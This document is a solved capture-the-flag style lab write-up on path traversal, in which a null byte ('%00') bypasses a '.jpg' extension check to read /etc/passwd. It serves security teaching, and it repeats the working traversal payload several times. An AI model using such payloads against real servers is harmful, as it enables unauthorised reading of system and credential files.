# Path Traversal — Validation of file extension with null byte bypass


**Difficulty:** Practitioner

**Status:** ✅ Solved



## Overview



This lab contains a **Path Traversal** vulnerability in the functionality that displays product images.



The application validates that the supplied filename ends with the expected file extension.



The goal is to retrieve the contents of:



```text

/etc/passwd

```



---



## Initial Request




The image request contains a user-controlled `filename` parameter:


```http

GET /image?filename=... HTTP/2

```



The application expects the filename to end with a valid image extension, such as:



```text

.jpg

```



A normal traversal payload such as:



```text

../../../etc/passwd

```



does not pass the extension validation because it does not end with `.jpg`.



---



## Null Byte



A **Null Byte** is a byte with the value:



```text

0x00

```



It is commonly represented as:



```text

\0

```



and URL-encoded as:



```text

%00

```



In some file-handling contexts, a null byte can act as a string terminator, causing data after it to be ignored.



For example:



```text

passwd\0.jpg

```



may be interpreted by an affected file-handling component as:



```text

passwd

```



---



## Exploitation



The extension validation can be bypassed by placing a null byte before the required extension:



```text

../../../etc/passwd%00.jpg

```




The structure is:



```text

Path Traversal + Null Byte + Allowed Extension

```



```text

../../../etc/passwd

              ↓

             %00

              ↓

             .jpg
```



The `.jpg` satisfies the extension check, while the null byte can cause the file-handling component to ignore the 

extension.


The application can therefore access:



```text

/etc/passwd

```



---


## Attack Flow


```text

User-controlled filename

        ↓

../../../etc/passwd%00.jpg

        ↓

Extension validation

        ↓

Ends with .jpg ✓

        ↓

Null Byte processing

        ↓

../../../etc/passwd

        ↓

Path Traversal

        ↓

/etc/passwd


```



---



## Key Takeaways



* File extension validation alone is not sufficient to prevent Path Traversal.


* A **Null Byte (`%00`)** can sometimes bypass filename validation in vulnerable file-handling contexts.

* The important concept is the difference between how the input is **validated** and how it is **processed** later.

* `%00` represents the null byte `0x00` in URL encoding.

* Null byte behavior depends on the programming language, libraries, and file-handling APIs. It should not be assumed 

to work against modern applications.


## Lab Payload



```text

../../../etc/passwd%00.jpg

```


**Result:** Retrieved `/etc/passwd` and solved the lab. ✅



## References




* PortSwigger Web Security Academy — Path Traversal
  https://portswigger.net/web-security/file-path-traversal


* OWASP — Path Traversal
  https://owasp.org/www-community/attacks/Path_Traversal
